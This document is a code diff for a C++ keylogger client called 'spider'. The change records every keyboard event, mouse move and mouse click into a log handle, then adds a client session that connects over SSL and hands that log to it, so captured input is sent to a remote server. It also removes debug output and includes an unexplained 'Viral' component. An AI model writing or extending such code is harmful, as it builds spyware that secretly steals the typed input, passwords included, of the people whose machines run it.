@@ -35,29 +35,31 @@ namespace spi
             __setup();
             _log(lg::Info) << SPIDER_LOG << " running ..." << std::endl;
             _keyLogger->run();
+            _clientSession->onConnect(boost::bind(&CSpiderCore::__setupLogHandleConnection, this, net::ErrorPlaceholder));
+            _clientSession->connect();
             _service.run();
             return true;
         }
 
     private:
+        void __setupLogHandleConnection(net::SSLConnection *sslConnection)
+        {
+            _logHandle.connect(sslConnection);
+        }
+
 
         void __setup()
         {
             _viral.setup();
             _logHandle.setup();
-//            _cmdHandler.setup();
             _keyLogger->setup();
-            // TODO : registerILoggableCallback()
             _keyLogger->onMouseMoveEvent([this](proto::MouseMove &&event){
-                std::cout << "mouseMove" << std::endl;
                 _logHandle.appendEntry(event);
             });
             _keyLogger->onMouseClickEvent([this](proto::MouseClick &&event){
-                std::cout << "mouseClick" << std::endl;
                 _logHandle.appendEntry(event);
             });
             _keyLogger->onKeyboardEvent([this](proto::KeyEvent &&event){
-                std::cout << "keyboard" << std::endl;
                 _logHandle.appendEntry(event);
             });
         }
@@ -71,7 +73,6 @@ namespace spi
         std::unique_ptr<ClientSession> _clientSession{std::make_unique<ClientSession>(_ctx, _service)};
         LogHandle _logHandle;
         Viral _viral;
-        CommandHandler _cmdHandler;
         KeyLogPtr _keyLogger{Factory::createKeyLogger(_service)};
         lg::Logger _log{"client-spider", lg::Level::Debug};
     };
